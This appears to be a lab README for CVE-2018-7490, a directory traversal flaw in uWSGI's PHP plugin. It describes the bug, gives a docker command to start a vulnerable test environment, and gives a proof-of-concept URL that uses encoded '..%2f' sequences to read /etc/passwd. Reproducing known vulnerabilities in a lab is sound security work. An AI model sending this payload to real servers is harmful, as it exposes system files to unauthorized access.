# uWSGI PHP Directory Traversal Vulnerability (CVE-2018-7490)

[中文版本(Chinese version)](README.zh-cn.md)

uWSGI is a web application server, which implements protocols such as WSGI/uwsgi/http, and supports for various languages through plugins.

The PHP plugin of uWSGI before 2.0.17 doesn't handle the detection of `DOCUMENT_ROOT` correctly, resulting in reading or running files outside the `DOCUMENT_ROOT` through the use of `..%2f`.

## Environment Setup

Enter the following command：

```
docker compose up -d
```

Visit `http://your-ip:8080` and you'll see the phpinfo page as the uwsgi-php server running successfully.

## POC

Directly visit `http://your-ip:8080/..%2f..%2f..%2f..%2f..%2fetc/passwd`, you will get the passwd file：
